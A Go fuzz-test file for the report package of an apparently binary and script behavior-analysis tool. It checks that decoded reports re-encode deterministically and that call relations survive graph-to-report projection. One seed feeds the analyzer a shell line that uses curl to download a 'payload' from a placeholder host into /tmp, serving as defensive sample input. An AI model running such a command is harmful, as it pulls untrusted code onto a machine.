package report

import (
	"bytes"
	"strings"
	"testing"
	"unicode/utf8"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func FuzzDecodeReportRoundTrip(f *testing.F) {
	f.Add([]byte(validSavedReportJSON("fuzz-minimal", "")))
	seed, err := InspectInline(
		[]byte("curl https://example.invalid/payload -o /tmp/payload\n"),
		"shell",
		artifact.Options{},
	)
	if err != nil {
		f.Fatalf("build report seed: %v", err)
	}
	var encoded bytes.Buffer
	if err := WriteJSON(&encoded, seed); err != nil {
		f.Fatalf("encode report seed: %v", err)
	}
	f.Add(encoded.Bytes())

	f.Fuzz(func(t *testing.T, input []byte) {
		// The production loader has a 64 MiB limit. Keep fuzz executions much
		// smaller so mutation throughput remains useful and independently bounded.
		if len(input) > 1<<20 {
			t.Skip()
		}
		report, err := decodeReport(bytes.NewReader(input))
		if err != nil {
			return
		}
		assertStableReportEncoding(t, report)
	})
}

func FuzzReportProjectionRoundTrip(f *testing.F) {
	f.Add([]byte("main"), []byte("helper"))
	f.Add([]byte("entry<>&"), []byte("callee\x00name"))

	f.Fuzz(func(t *testing.T, callerInput, calleeInput []byte) {
		caller := fuzzFunctionName(callerInput, "caller")
		callee := fuzzFunctionName(calleeInput, "callee")
		if caller == callee {
			callee += "-target"
		}

		var artifacts artifact.Graph
		nodeID := artifacts.AddNode(artifact.Node{LogicalPath: "fuzz", Kind: "mach-o"})
		var graph behavior.Graph
		callerScope := graph.AddScope(behavior.Scope{
			NodeID: nodeID, Kind: "function", Function: caller, Architecture: "arm64",
		})
		calleeScope := graph.AddScope(behavior.Scope{
			NodeID: nodeID, Kind: "function", Function: callee, Architecture: "arm64",
		})
		callEvidence := graph.AddEvidence(behavior.Evidence{
			NodeID: nodeID, ScopeID: callerScope, Logical: "fuzz", Function: caller, Arch: "arm64",
			Method: "fuzz", Kind: "direct-call", Value: callee,
		})
		featureID := graph.AddFeature(behavior.Feature{
			NodeID: nodeID, ScopeID: callerScope, Key: "macho.function_call", Value: callee,
			EvidenceIDs: []string{callEvidence}, Support: behavior.SupportDirect,
			Execution: behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
		})
		relationID := graph.AddRelation(behavior.OperationRelation{
			Kind:        behavior.RelationCalls,
			From:        behavior.IDRelationEndpoint(behavior.RelationEndpointScope, callerScope),
			To:          behavior.IDRelationEndpoint(behavior.RelationEndpointScope, calleeScope),
			EvidenceIDs: []string{callEvidence}, Support: behavior.SupportDirect,
			Execution:    behavior.ExecutionContext{Connectivity: behavior.ConnectivityUnknown},
			Architecture: "arm64",
		})
		if callerScope == "" || calleeScope == "" || callEvidence == "" || featureID == "" || relationID == "" {
			t.Fatalf("valid projection fixture was rejected: scopes=%q,%q evidence=%q feature=%q relation=%q", callerScope, calleeScope, callEvidence, featureID, relationID)
		}

		report, err := fromGraphs("fuzz", artifacts, graph, nil, artifact.Options{}.Normalized())
		if err != nil {
			t.Fatalf("project report: %v", err)
		}
		if len(report.Features) != 1 || report.Features[0].ID != featureID {
			t.Fatalf("CALLS proof Feature was lost during projection: %#v", report.Features)
		}
		if len(report.OperationRelations) != 1 || report.OperationRelations[0].ID != relationID {
			t.Fatalf("CALLS relation was lost during projection: %#v", report.OperationRelations)
		}
		assertStableReportEncoding(t, report)
	})
}

func fuzzFunctionName(input []byte, fallback string) string {
	name := strings.ToValidUTF8(string(input), "�")
	if utf8.RuneCountInString(name) > 64 {
		name = string([]rune(name)[:64])
	}
	if name == "" {
		return fallback
	}
	return name
}

func assertStableReportEncoding(t testing.TB, report Report) {
	t.Helper()
	var first bytes.Buffer
	if err := WriteJSON(&first, report); err != nil {
		t.Fatalf("encode accepted report: %v", err)
	}
	reloaded, err := decodeReport(bytes.NewReader(first.Bytes()))
	if err != nil {
		t.Fatalf("reload accepted report: %v", err)
	}
	var second bytes.Buffer
	if err := WriteJSON(&second, reloaded); err != nil {
		t.Fatalf("re-encode accepted report: %v", err)
	}
	if !bytes.Equal(first.Bytes(), second.Bytes()) {
		t.Fatal("accepted report encoding is not deterministic after strict reload")
	}
}
